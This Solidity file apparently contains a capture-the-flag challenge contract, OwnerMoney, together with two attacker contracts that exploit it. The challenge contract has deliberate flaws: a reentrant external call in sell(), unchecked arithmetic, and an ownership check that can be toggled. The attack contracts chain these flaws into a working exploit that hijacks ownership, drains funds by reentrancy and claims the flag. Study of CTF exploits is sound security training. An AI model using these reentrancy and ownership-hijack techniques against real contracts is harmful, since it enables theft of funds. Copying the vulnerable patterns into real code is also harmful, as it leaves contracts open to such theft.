pragma solidity ^0.4.23;

interface Changing {
    function isOwner(address) view public returns (bool);
}

contract OwnerMoney {
    
    address private owner;
    address private backup;
    
    mapping(address => uint) public balanceOf;
    mapping(address => bool) public status;
    mapping(address => uint) public buyTimes;
    
    constructor() {
        owner = msg.sender;
        backup = msg.sender;
    }
    
    event pikapika_SendFlag(string b64email);
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    function payforflag(string b64email) onlyOwner public {
        
        require(buyTimes[msg.sender] >= 100);
        _init();
        buyTimes[msg.sender] = 0;
        
        address(0x4cfbdFE01DAEF460B925773754821E7461750923).transfer(address(this).balance);
        emit pikapika_SendFlag(b64email);
        
    }
    
    function _init() internal {
        owner = backup;
    }
    
    function change(address _owner) public {
        Changing tmp = Changing(msg.sender);
        if(!tmp.isOwner(_owner)){
            status[msg.sender] = tmp.isOwner(_owner);
        }
    }
    
    function change_Owner() {
        
        require(tx.origin != msg.sender);
        require(uint(msg.sender) & 0xfff == 0xfff);
        
        if(status[msg.sender] == true){
            status[msg.sender] = false;
            owner = msg.sender;
        }
    }
    
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != address(0x0));
        require(_value > 0);
        
        uint256 oldFromBalance = balanceOf[_from];
        uint256 oldToBalance = balanceOf[_to];
        
        uint256 newFromBalance =  balanceOf[_from] - _value;
        uint256 newToBalance =  balanceOf[_to] + _value;
        
        require(oldFromBalance >= _value);
        require(newToBalance > oldToBalance);
        
        balanceOf[_from] = newFromBalance;
        balanceOf[_to] = newToBalance;
        
        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value); 
        return true;
    }
    
    function buy() payable public returns (bool success){
        require(tx.origin != msg.sender);
        require(uint(msg.sender) & 0xfff == 0xfff);
        require(buyTimes[msg.sender]==0);
        require(balanceOf[msg.sender]==0);
        require(msg.value == 1 wei);
        balanceOf[msg.sender] = 100;
        buyTimes[msg.sender] = 1;
        return true;
    }
    
    function sell(uint256 _amount) public returns (bool success){
        require(_amount >= 200);
        require(buyTimes[msg.sender] > 0);
        require(balanceOf[msg.sender] >= _amount);
        require(address(this).balance >= _amount);
        msg.sender.call.value(_amount)();
        _transfer(msg.sender, address(this), _amount);
        buyTimes[msg.sender] -= 1;
        return true;
    }
    
    function balance0f(address _address) public view returns (uint256 balance) {
        return balanceOf[_address];
    }
    
    function eth_balance() public view returns (uint256 ethBalance){
        return address(this).balance;
    }
    
}



contract attack1 {
    
    address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b ;
    OwnerMoney target = OwnerMoney(instance_address);
    bool public flag = true;
    uint public have_sell = 0;
    
    constructor() payable {}
    
    function isOwner(address) public returns (bool){
        flag = !flag;
        return flag;
    }
    
    function hack1() {
        target.change(address(this));

        target.change_Owner();

        target.buy.value(1)();
    }
    
    function hack2() {
        target.sell(200);
    }
    
    function hack3(string b64email) {
        target.payforflag(b64email);
    }
    
    function() payable {
        if (have_sell < 1) {
            have_sell += 1;
            target.sell(200);
        }
    }
}

contract attack2 {
    address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b;
    OwnerMoney target = OwnerMoney(instance_address);
    
    constructor() payable {}
    
    function hack1() {
        target.buy.value(1)();
        target.transfer(0xde76c7f9fff36f128d153ee068ccd5a0e7b9afff,100);
    }

}